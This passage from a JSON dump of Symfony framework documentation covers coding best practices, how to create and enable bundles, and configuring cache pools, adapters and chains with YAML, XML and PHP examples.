only get access to the most\ncommon services (e.g ``twig``, ``router``, ``doctrine``, etc.), directly from the\ncontainer via ``$this->container->get()``.\nInstead, you must use dependency injection to fetch services by\n:ref:`type-hinting action method arguments <controller-accessing-services>` or\nconstructor arguments.\n\nUse Entity Value Resolvers If They Are Convenient\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you're using :doc:`Doctrine </doctrine>`, then you can *optionally* use\nthe :ref:`EntityValueResolver <doctrine-entity-value-resolver>` to\nautomatically query for an entity and pass it as an argument to your\ncontroller. It will also show a 404 page if no entity can be found.\n\nIf the logic to get an entity from a route variable is more complex, instead of\nconfiguring the EntityValueResolver, it's better to make the Doctrine query\ninside the controller (e.g. by calling to a :doc:`Doctrine repository method </doctrine>`).\n\nTemplates\n---------\n\nUse Snake Case for Template Names and Variables\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUse lowercase snake_case for template names, directories, and variables (e.g.\n``user_profile`` instead of ``userProfile`` and ``product/edit_form.html.twig``\ninstead of ``Product/EditForm.html.twig``).\n\nPrefix Template Fragments with an Underscore\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nTemplate fragments, also called *\"partial templates\"*, allow to\n:ref:`reuse template contents <templates-reuse-contents>`. Prefix their names\nwith an underscore to better differentiate them from complete templates (e.g.\n``_user_metadata.html.twig`` or ``_caution_message.html.twig``).\n\nForms\n-----\n\nDefine your Forms as PHP Classes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nCreating :ref:`forms in classes <creating-forms-in-classes>` allows reusing\nthem in different parts of the application. Besides, not creating forms in\ncontrollers simplifies the code and maintenance of the controllers.\n\nAdd Form Buttons in Templates\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nForm classes should be agnostic to where they will be used. For example, the\nbutton of a form used to both create and edit items should change from \"Add new\"\nto \"Save changes\" depending on where it's used.\n\nInstead of adding buttons in form classes or the controllers, it's recommended\nto add buttons in the templates. This also improves the separation of concerns\nbecause the button styling (CSS class and other attributes) is defined in the\ntemplate instead of in a PHP class.\n\nHowever, if you create a :doc:`form with multiple submit buttons </form/multiple_buttons>`\nyou should define them in the controller instead of the template. Otherwise, you\nwon't be able to check which button was clicked when handling the form in the controller.\n\nDefine Validation Constraints on the Underlying Object\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAttaching :doc:`validation constraints </reference/constraints>` to form fields\ninstead of to the mapped object prevents the validation from being reused in\nother forms or other places where the object is used.\n\n.. _best-practice-handle-form:\n\nUse a Single Action to Render and Process the Form\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n:ref:`Rendering forms <rendering-forms>` and :ref:`processing forms <processing-forms>`\nare two of the main tasks when handling forms. Both are too similar (most of the\ntime, almost identical), so it's much simpler to let a single controller action\nhandle both.\n\n.. _best-practice-internationalization:\n\nInternationalization\n--------------------\n\nUse the XLIFF Format for Your Translation Files\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nOf all the translation formats supported by Symfony (PHP, Qt, ``.po``, ``.mo``,\nJSON, CSV, INI, etc.), ``XLIFF`` and ``gettext`` have the best support in the tools used\nby professional translators. And since it's based on XML, you can validate ``XLIFF``\nfile contents as you write them.\n\nSymfony also supports notes in XLIFF files, making them more user-friendly for\ntranslators. At the end, good translations are all about context, and these\nXLIFF notes allow you to define that context.\n\nUse Keys for Translations Instead of Content Strings\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUsing keys simplifies the management of the translation files because you can\nchange the original contents in templates, controllers, and services without\nhaving to update all the translation files.\n\nKeys should always describe their *purpose* and *not* their location. For\nexample, if a form has a field with the label \"Username\", then a nice key\nwould be ``label.username``, *not* ``edit_form.label.username``.\n\nSecurity\n--------\n\nDefine a Single Firewall\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nUnless you have two legitimately different authentication systems and users\n(e.g. form login for the main site and a token system for your API only), it's\nrecommended to have only one firewall to keep things simple.\n\nAdditionally, you should use the ``anonymous`` key under your firewall. If you\nrequire users to be logged in for different sections of your site, use the\n:doc:`access_control </security/access_control>` option.\n\nUse the ``auto`` Password Hasher\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe :ref:`auto password hasher <reference-security-encoder-auto>` automatically\nselects the best possible encoder/hasher depending on your PHP installation.\nCurrently, the default auto hasher is ``bcrypt``.\n\nUse Voters to Implement Fine-grained Security Restrictions\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your security logic is complex, you should create custom\n:doc:`security voters </security/voters>` instead of defining long expressions\ninside the ``#[Security]`` attribute.\n\nWeb Assets\n----------\n\n.. _use-webpack-encore-to-process-web-assets:\n\nUse AssetMapper to Manage Web Assets\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWeb assets are the CSS, JavaScript, and image files that make the frontend of\nyour site look and work great. :doc:`AssetMapper </frontend/asset_mapper>` lets\nyou write modern JavaScript and CSS without the complexity of using a bundler\nsuch as `Webpack`_ (directly or via :doc:`Webpack Encore </frontend/encore/index>`).\n\nTests\n-----\n\nSmoke Test your URLs\n~~~~~~~~~~~~~~~~~~~~\n\nIn software engineering, `smoke testing`_ consists of *\"preliminary testing to\nreveal simple failures severe enough to reject a prospective software release\"*.\nUsing `PHPUnit data providers`_ you can define a functional test that\nchecks that all application URLs load successfully::\n\n    // tests/ApplicationAvailabilityFunctionalTest.php\n    namespace App\\Tests;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;\n\n    class ApplicationAvailabilityFunctionalTest extends WebTestCase\n    {\n        /**\n         * @dataProvider urlProvider\n         */\n        public function testPageIsSuccessful($url): void\n        {\n            $client = self::createClient();\n            $client->request('GET', $url);\n\n            $this->assertResponseIsSuccessful();\n        }\n\n        public function urlProvider(): \\Generator\n        {\n            yield ['/'];\n            yield ['/posts'];\n            yield ['/post/fixture-post-1'];\n            yield ['/blog/category/fixture-category'];\n            yield ['/archives'];\n            // ...\n        }\n    }\n\nAdd this test while creating your application because it requires little effort\nand checks that none of your pages returns an error. Later, you'll add more\nspecific tests for each page.\n\n.. _hardcode-urls-in-a-functional-test:\n\nHard-code URLs in a Functional Test\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn Symfony applications, it's recommended to :ref:`generate URLs <routing-generating-urls>`\nusing routes to automatically update all links when a URL changes. However, if a\npublic URL changes, users won't be able to browse it unless you set up a\nredirection to the new URL.\n\nThat's why it's recommended to use raw URLs in tests instead of generating them\nfrom routes. Whenever a route changes, tests will fail, and you'll know that\nyou must set up a redirection.\n\n.. _`Symfony Demo`: https://github.com/symfony/demo\n.. _`download Symfony`: https://symfony.com/download\n.. _`Composer`: https://getcomposer.org/\n.. _`feature toggles`: https://en.wikipedia.org/wiki/Feature_toggle\n.. _`smoke testing`: https://en.wikipedia.org/wiki/Smoke_testing_(software)\n.. _`Webpack`: https://webpack.js.org/\n.. _`PHPUnit data providers`: https://docs.phpunit.de/en/9.6/writing-tests-for-phpunit.html#data-providers\n"
        },
        {
          "name": "bundles.rst",
          "type": "blob",
          "size": 5.71875,
          "content": ".. _page-creation-bundles:\n\nThe Bundle System\n=================\n\n.. warning::\n\n    In Symfony versions prior to 4.0, it was recommended to organize your own\n    application code using bundles. This is :ref:`no longer recommended <best-practice-no-application-bundles>` and bundles\n    should only be used to share code and features between multiple applications.\n\nA bundle is similar to a plugin in other software, but even better. The core\nfeatures of Symfony framework are implemented with bundles (FrameworkBundle,\nSecurityBundle, DebugBundle, etc.) They are also used to add new features in\nyour application via `third-party bundles`_.\n\nBundles used in your applications must be enabled per\n:ref:`environment <configuration-environments>` in the ``config/bundles.php``\nfile::\n\n    // config/bundles.php\n    return [\n        // 'all' means that the bundle is enabled for any Symfony environment\n        Symfony\\Bundle\\FrameworkBundle\\FrameworkBundle::class => ['all' => true],\n        // ...\n\n        // this bundle is enabled only in 'dev'\n        Symfony\\Bundle\\DebugBundle\\DebugBundle::class => ['dev' => true],\n        // ...\n\n        // this bundle is enabled only in 'dev' and 'test', so you can't use it in 'prod'\n        Symfony\\Bundle\\WebProfilerBundle\\WebProfilerBundle::class => ['dev' => true, 'test' => true],\n        // ...\n    ];\n\n.. tip::\n\n    In a default Symfony application that uses :ref:`Symfony Flex <symfony-flex>`,\n    bundles are enabled/disabled automatically for you when installing/removing\n    them, so you don't need to look at or edit this ``bundles.php`` file.\n\nCreating a Bundle\n-----------------\n\nThis section creates and enables a new bundle to show there are only a few steps required.\nThe new bundle is called AcmeBlogBundle, where the ``Acme`` portion is an example\nname that should be replaced by some \"vendor\" name that represents you or your\norganization (e.g. AbcBlogBundle for some company named ``Abc``).\n\nStart by creating a new class called ``AcmeBlogBundle``::\n\n    // src/AcmeBlogBundle.php\n    namespace Acme\\BlogBundle;\n\n    use Symfony\\Component\\HttpKernel\\Bundle\\AbstractBundle;\n\n    class AcmeBlogBundle extends AbstractBundle\n    {\n    }\n\n.. warning::\n\n    If your bundle must be compatible with previous Symfony versions you have to\n    extend from the :class:`Symfony\\\\Component\\\\HttpKernel\\\\Bundle\\\\Bundle` instead.\n\n.. tip::\n\n    The name AcmeBlogBundle follows the standard\n    :ref:`Bundle naming conventions <bundles-naming-conventions>`. You could\n    also choose to shorten the name of the bundle to simply BlogBundle by naming\n    this class BlogBundle (and naming the file ``BlogBundle.php``).\n\nThis empty class is the only piece you need to create the new bundle. Though\ncommonly empty, this class is powerful and can be used to customize the behavior\nof the bundle. Now that you've created the bundle, enable it::\n\n    // config/bundles.php\n    return [\n        // ...\n        Acme\\BlogBundle\\AcmeBlogBundle::class => ['all' => true],\n    ];\n\nAnd while it doesn't do anything yet, AcmeBlogBundle is now ready to be used.\n\n.. _bundles-directory-structure:\n\nBundle Directory Structure\n--------------------------\n\nThe directory structure of a bundle is meant to help to keep code consistent\nbetween all Symfony bundles. It follows a set of conventions, but is flexible\nto be adjusted if needed:\n\n``assets/``\n    Contains the web asset sources like JavaScript and TypeScript files, CSS and\n    Sass files, but also images and other assets related to the bundle that are\n    not in ``public/`` (e.g. Stimulus controllers).\n\n``config/``\n    Houses configuration, including routing configuration (e.g. ``routes.php``).\n\n``public/``\n    Contains web assets (images, compiled CSS and JavaScript files, etc.) and is\n    copied or symbolically linked into the project ``public/`` directory via the\n    ``assets:install`` console command.\n\n``src/``\n    Contains all PHP classes related to the bundle logic (e.g. ``Controller/CategoryController.php``).\n\n``templates/``\n    Holds templates organized by controller name (e.g. ``category/show.html.twig``).\n\n``tests/``\n    Holds all tests for the bundle.\n\n``translations/``\n    Holds translations organized by domain and locale (e.g. ``AcmeBlogBundle.en.xlf``).\n\n.. _bundles-legacy-directory-structure:\n\n.. warning::\n\n    The recommended bundle structure was changed in Symfony 5, read the\n    `Symfony 4.4 bundle documentation`_ for information about the old\n    structure.\n\n    When using the new ``AbstractBundle`` class, the bundle defaults to the\n    new structure. Override the ``Bundle::getPath()`` method to change to\n    the old structure::\n\n        class AcmeBlogBundle extends AbstractBundle\n        {\n            public function getPath(): string\n            {\n                return __DIR__;\n            }\n        }\n\n.. tip::\n\n    It's recommended to use the `PSR-4`_ autoload standard: use the namespace as key,\n    and the location of the bundle's main class (relative to ``composer.json``)\n    as value. As the main class is located in the ``src/`` directory of the bundle:\n\n    .. code-block:: json\n\n        {\n            \"autoload\": {\n                \"psr-4\": {\n                    \"Acme\\\\BlogBundle\\\\\": \"src/\"\n                }\n            },\n            \"autoload-dev\": {\n                \"psr-4\": {\n                    \"Acme\\\\BlogBundle\\\\Tests\\\\\": \"tests/\"\n                }\n            }\n        }\n\nLearn more\n----------\n\n* :doc:`/bundles/override`\n* :doc:`/bundles/best_practices`\n* :doc:`/bundles/configuration`\n* :doc:`/bundles/extension`\n* :doc:`/bundles/prepend_extension`\n\n.. _`third-party bundles`: https://github.com/search?q=topic%3Asymfony-bundle&type=Repositories\n.. _`Symfony 4.4 bundle documentation`: https://symfony.com/doc/4.4/bundles.html#bundle-directory-structure\n.. _`PSR-4`: https://www.php-fig.org/psr/psr-4/\n"
        },
        {
          "name": "bundles",
          "type": "tree",
          "content": null
        },
        {
          "name": "cache.rst",
          "type": "blob",
          "size": 36.267578125,
          "content": "Cache\n=====\n\nUsing a cache is a great way of making your application run quicker. The Symfony cache\ncomponent ships with many adapters to different storages. Every adapter is\ndeveloped for high performance.\n\nThe following example shows a typical usage of the cache::\n\n    use Symfony\\Contracts\\Cache\\ItemInterface;\n\n    // The callable will only be executed on a cache miss.\n    $value = $pool->get('my_cache_key', function (ItemInterface $item): string {\n        $item->expiresAfter(3600);\n\n        // ... do some HTTP request or heavy computations\n        $computedValue = 'foobar';\n\n        return $computedValue;\n    });\n\n    echo $value; // 'foobar'\n\n    // ... and to remove the cache key\n    $pool->delete('my_cache_key');\n\nSymfony supports Cache Contracts and PSR-6/16 interfaces.\nYou can read more about these at the :doc:`component documentation </components/cache>`.\n\n.. _cache-configuration-with-frameworkbundle:\n\nConfiguring Cache with FrameworkBundle\n--------------------------------------\n\nWhen configuring the cache component there are a few concepts you should know\nof:\n\n**Pool**\n    This is a service that you will interact with. Each pool will always have\n    its own namespace and cache items. There is never a conflict between pools.\n**Adapter**\n    An adapter is a *template* that you use to create pools.\n**Provider**\n    A provider is a service that some adapters use to connect to the storage.\n    Redis and Memcached are examples of such adapters. If a DSN is used as the\n    provider then a service is automatically created.\n\n.. _cache-app-system:\n\nThere are two pools that are always enabled by default. They are ``cache.app`` and\n``cache.system``. The system cache is used for things like annotations, serializer,\nand validation. The ``cache.app`` can be used in your code. You can configure which\nadapter (template) they use by using the ``app`` and ``system`` key like:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/cache.yaml\n        framework:\n            cache:\n                app: cache.adapter.filesystem\n                system: cache.adapter.system\n\n    .. code-block:: xml\n\n        <!-- config/packages/cache.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:cache\n                    app=\"cache.adapter.filesystem\"\n                    system=\"cache.adapter.system\"\n                />\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/cache.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->cache()\n                ->app('cache.adapter.filesystem')\n                ->system('cache.adapter.system')\n            ;\n        };\n\n.. tip::\n\n    While it is possible to reconfigure the ``system`` cache, it's recommended\n    to keep the default configuration applied to it by Symfony.\n\nThe Cache component comes with a series of adapters pre-configured:\n\n* :doc:`cache.adapter.apcu </components/cache/adapters/apcu_adapter>`\n* :doc:`cache.adapter.array </components/cache/adapters/array_cache_adapter>`\n* :doc:`cache.adapter.doctrine_dbal </components/cache/adapters/doctrine_dbal_adapter>`\n* :doc:`cache.adapter.filesystem </components/cache/adapters/filesystem_adapter>`\n* :doc:`cache.adapter.memcached </components/cache/adapters/memcached_adapter>`\n* :doc:`cache.adapter.pdo </components/cache/adapters/pdo_adapter>`\n* :doc:`cache.adapter.psr6 </components/cache/adapters/proxy_adapter>`\n* :doc:`cache.adapter.redis </components/cache/adapters/redis_adapter>`\n* :ref:`cache.adapter.redis_tag_aware <redis-tag-aware-adapter>` (Redis adapter optimized to work with tags)\n\n.. note::\n\n    There's also a special ``cache.adapter.system`` adapter. It's recommended to\n    use it for the :ref:`system cache <cache-app-system>`. This adapter uses some\n    logic to dynamically select the best possible storage based on your system\n    (either PHP files or APCu).\n\nSome of these adapters could be configured via shortcuts.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/cache.yaml\n        framework:\n            cache:\n                directory: '%kernel.cache_dir%/pools' # Only used with cache.adapter.filesystem\n\n                default_doctrine_dbal_provider: 'doctrine.dbal.default_connection'\n                default_psr6_provider: 'app.my_psr6_service'\n                default_redis_provider: 'redis://localhost'\n                default_memcached_provider: 'memcached://localhost'\n                default_pdo_provider: 'pgsql:host=localhost'\n\n    .. code-block:: xml\n\n        <!-- config/packages/cache.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <!-- \"directory\" attribute is only used with cache.adapter.filesystem -->\n                <framework:cache directory=\"%kernel.cache_dir%/pools\"\n                    default-doctrine-dbal-provider=\"doctrine.dbal.default_connection\"\n                    default-psr6-provider=\"app.my_psr6_service\"\n                    default-redis-provider=\"redis://localhost\"\n                    default-memcached-provider=\"memcached://localhost\"\n                    default-pdo-provider=\"pgsql:host=localhost\"\n                />\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/cache.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->cache()\n                // Only used with cache.adapter.filesystem\n                ->directory('%kernel.cache_dir%/pools')\n\n                ->defaultDoctrineDbalProvider('doctrine.dbal.default_connection')\n                ->defaultPsr6Provider('app.my_psr6_service')\n                ->defaultRedisProvider('redis://localhost')\n                ->defaultMemcachedProvider('memcached://localhost')\n                ->defaultPdoProvider('pgsql:host=localhost')\n            ;\n        };\n\n.. versionadded:: 7.1\n\n    Using a DSN as the provider for the PDO adapter was introduced in Symfony 7.1.\n\n.. _cache-create-pools:\n\nCreating Custom (Namespaced) Pools\n----------------------------------\n\nYou can also create more customized pools:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/cache.yaml\n        framework:\n            cache:\n                default_memcached_provider: 'memcached://localhost'\n\n                pools:\n                    # creates a \"custom_thing.cache\" service\n                    # autowireable via \"CacheInterface $customThingCache\"\n                    # uses the \"app\" cache configuration\n                    custom_thing.cache:\n                        adapter: cache.app\n\n                    # creates a \"my_cache_pool\" service\n                    # autowireable via \"CacheInterface $myCachePool\"\n                    my_cache_pool:\n                        adapter: cache.adapter.filesystem\n\n                    # uses the default_memcached_provider from above\n                    acme.cache:\n                        adapter: cache.adapter.memcached\n\n                    # control adapter's configuration\n                    foobar.cache:\n                        adapter: cache.adapter.memcached\n                        provider: 'memcached://user:password@example.com'\n\n                    # uses the \"foobar.cache\" pool as its backend but controls\n                    # the lifetime and (like all pools) has a separate cache namespace\n                    short_cache:\n                        adapter: foobar.cache\n                        default_lifetime: 60\n\n    .. code-block:: xml\n\n        <!-- config/packages/cache.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:cache default-memcached-provider=\"memcached://localhost\">\n                    <!-- creates a \"custom_thing.cache\" service\n                         autowireable via \"CacheInterface $customThingCache\"\n                         uses the \"app\" cache configuration -->\n                    <framework:pool name=\"custom_thing.cache\" adapter=\"cache.app\"/>\n\n                    <!-- creates a \"my_cache_pool\" service\n                         autowireable via \"CacheInterface $myCachePool\" -->\n                    <framework:pool name=\"my_cache_pool\" adapter=\"cache.adapter.filesystem\"/>\n\n                    <!-- uses the default_memcached_provider from above -->\n                    <framework:pool name=\"acme.cache\" adapter=\"cache.adapter.memcached\"/>\n\n                    <!-- control adapter's configuration -->\n                    <framework:pool name=\"foobar.cache\" adapter=\"cache.adapter.memcached\"\n                        provider=\"memcached://user:password@example.com\"\n                    />\n\n                    <!-- uses the \"foobar.cache\" pool as its backend but controls\n                         the lifetime and (like all pools) has a separate cache namespace -->\n                    <framework:pool name=\"short_cache\" adapter=\"foobar.cache\" default-lifetime=\"60\"/>\n                </framework:cache>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/cache.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $cache = $framework->cache();\n            $cache->defaultMemcachedProvider('memcached://localhost');\n\n            // creates a \"custom_thing.cache\" service\n            // autowireable via \"CacheInterface $customThingCache\"\n            // uses the \"app\" cache configuration\n            $cache->pool('custom_thing.cache')\n                ->adapters(['cache.app']);\n\n            // creates a \"my_cache_pool\" service\n            // autowireable via \"CacheInterface $myCachePool\"\n            $cache->pool('my_cache_pool')\n                ->adapters(['cache.adapter.filesystem']);\n\n            // uses the default_memcached_provider from above\n            $cache->pool('acme.cache')\n                ->adapters(['cache.adapter.memcached']);\n\n             // control adapter's configuration\n            $cache->pool('foobar.cache')\n                ->adapters(['cache.adapter.memcached'])\n                ->provider('memcached://user:password@example.com');\n\n            $cache->pool('short_cache')\n                ->adapters(['foobar.cache'])\n                ->defaultLifetime(60);\n        };\n\nEach pool manages a set of independent cache keys: keys from different pools\n*never* collide, even if they share the same backend. This is achieved by prefixing\nkeys with a namespace that's generated by hashing the name of the pool, the name\nof the cache adapter class and a :ref:`configurable seed <reference-cache-prefix-seed>`\nthat defaults to the project directory and compiled container class.\n\nEach custom pool becomes a service whose service ID is the name of the pool\n(e.g. ``custom_thing.cache``). An autowiring alias is also created for each pool\nusing the camel case version of its name - e.g. ``custom_thing.cache`` can be\ninjected automatically by naming the argument ``$customThingCache`` and type-hinting it\nwith either :class:`Symfony\\\\Contracts\\\\Cache\\\\CacheInterface` or\n``Psr\\Cache\\CacheItemPoolInterface``::\n\n    use Symfony\\Contracts\\Cache\\CacheInterface;\n    // ...\n\n    // from a controller method\n    public function listProducts(CacheInterface $customThingCache): Response\n    {\n        // ...\n    }\n\n    // in a service\n    public function __construct(private CacheInterface $customThingCache)\n    {\n        // ...\n    }\n\n.. tip::\n\n    If you need the namespace to be interoperable with a third-party app,\n    you can take control over auto-generation by setting the ``namespace``\n    attribute of the ``cache.pool`` service tag. For example, you can\n    override the service definition of the adapter:\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/services.yaml\n            services:\n                # ...\n\n                app.cache.adapter.redis:\n                    parent: 'cache.adapter.redis'\n                    tags:\n                        - { name: 'cache.pool', namespace: 'my_custom_namespace' }\n\n        .. code-block:: xml\n\n            <!-- config/services.xml -->\n            <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n            <container xmlns=\"http://symfony.com/schema/dic/services\"\n                xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n                xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                    https://symfony.com/schema/dic/services/services-1.0.xsd\"\n            >\n                <services>\n                    <!-- ... -->\n\n                    <service id=\"app.cache.adapter.redis\" parent=\"cache.adapter.redis\">\n                        <tag name=\"cache.pool\" namespace=\"my_custom_namespace\"/>\n                    </service>\n                </services>\n            </container>\n\n        .. code-block:: php\n\n            // config/services.php\n            namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n            return function(ContainerConfigurator $container): void {\n                $container->services()\n                    // ...\n\n                    ->set('app.cache.adapter.redis')\n                        ->parent('cache.adapter.redis')\n                        ->tag('cache.pool', ['namespace' => 'my_custom_namespace'])\n                ;\n            };\n\nCustom Provider Options\n-----------------------\n\nSome providers have specific options that can be configured. The\n:doc:`RedisAdapter </components/cache/adapters/redis_adapter>` allows you to\ncreate providers with the options ``timeout``, ``retry_interval``. etc. To use these\noptions with non-default values you need to create your own ``\\Redis`` provider\nand use that when configuring the pool.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/cache.yaml\n        framework:\n            cache:\n                pools:\n                    cache.my_redis:\n                        adapter: cache.adapter.redis\n                        provider: app.my_custom_redis_provider\n\n        services:\n            app.my_custom_redis_provider:\n                class: \\Redis\n                factory: ['Symfony\\Component\\Cache\\Adapter\\RedisAdapter', 'createConnection']\n                arguments:\n                    - 'redis://localhost'\n                    - { retry_interval: 2, timeout: 10 }\n\n    .. code-block:: xml\n\n        <!-- config/packages/cache.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:cache>\n                    <framework:pool name=\"cache.my_redis\"\n                        adapter=\"cache.adapter.redis\"\n                        provider=\"app.my_custom_redis_provider\"\n                    />\n                </framework:cache>\n            </framework:config>\n\n            <services>\n                <service id=\"app.my_custom_redis_provider\" class=\"\\Redis\">\n                    <factory class=\"Symfony\\Component\\Cache\\Adapter\\RedisAdapter\" method=\"createConnection\"/>\n                    <argument>redis://localhost</argument>\n                    <argument type=\"collection\">\n                        <argument key=\"retry_interval\">2</argument>\n                        <argument key=\"timeout\">10</argument>\n                    </argument>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/cache.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Symfony\\Component\\Cache\\Adapter\\RedisAdapter;\n        use Symfony\\Component\\DependencyInjection\\ContainerBuilder;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (ContainerBuilder $container, FrameworkConfig $framework): void {\n            $framework->cache()\n                ->pool('cache.my_redis')\n                    ->adapters(['cache.adapter.redis'])\n                    ->provider('app.my_custom_redis_provider');\n\n            $container->register('app.my_custom_redis_provider', \\Redis::class)\n                ->setFactory([RedisAdapter::class, 'createConnection'])\n                ->addArgument('redis://localhost')\n                ->addArgument([\n                    'retry_interval' => 2,\n                    'timeout' => 10\n                ])\n            ;\n        };\n\nCreating a Cache Chain\n----------------------\n\nDifferent cache adapters have different strengths and weaknesses. Some might be\nreally quick but optimized to store small items and some may be able to contain\na lot of data but are quite slow. To get the best of both worlds you may use a\nchain of adapters.\n\nA cache chain combines several cache pools into a single one. When storing an\nitem in a cache chain, Symfony stores it in all pools sequentially. When\nretrieving an item, Symfony tries to get it from the first pool. If it's not\nfound, it tries the next pools until the item is found or an exception is thrown.\nBecause of this behavior, it's recommended to define the adapters in the chain\nin order from fastest to slowest.\n\nIf an error happens when storing an item in a pool, Symfony stores it in the\nother pools and no exception is thrown. Later, when the item is retrieved,\nSymfony stores the item automatically in all the missing pools.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/cache.yaml\n        framework:\n            cache:\n                pools:\n                    my_cache_pool:\n                        default_lifetime: 31536000  # One year\n                        adapters:\n                          - cache.adapter.array\n                          - cache.adapter.apcu\n                          - {name: cache.adapter.redis, provider: 'redis://user:password@example.com'}\n\n    .. code-block:: xml\n\n        <!-- config/packages/cache.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:cache>\n                    <framework:pool name=\"my_cache_pool\"\n                        default-lifetime=\"31536000\"> <!-- One year -->\n                        <framework:adapter name=\"cache.adapter.array\"/>\n                        <framework:adapter name=\"cache.adapter.apcu\"/>\n                        <framework:adapter name=\"cache.adapter.redis\" provider=\"redis://user:password@example.com\"/>\n                    </framework:pool>\n                </framework:cache>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/cache.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->cache()\n                ->pool('my_cache_pool')\n                    ->defaultLifetime(31536000) // One year\n                    ->adapters([\n                        'cache.adapter.array',\n                        'cache.adapter.apcu',\n                        ['name' => 'cache.adapter.redis', 'provider' => 'redis://user:password@example.com'],\n                    ])\n            ;\n        };\n\nUsing Cache Tags\n----------------\n\nIn applications with many cache keys it could be useful to organize the data stored\nto be able to invalidate the cache more efficiently. One way to achieve that is to\nuse cache tags. One or more tags could be added to the cache item. All items with\nthe same tag could be invalidated with one function call::\n\n    use Symfony\\Contracts\\Cache\\ItemInterface;\n    use Symfony\\Contracts\\Cache\\TagAwareCacheInterface;\n\n    class SomeClass\n    {\n        // using autowiring to inject the cache pool\n        public function 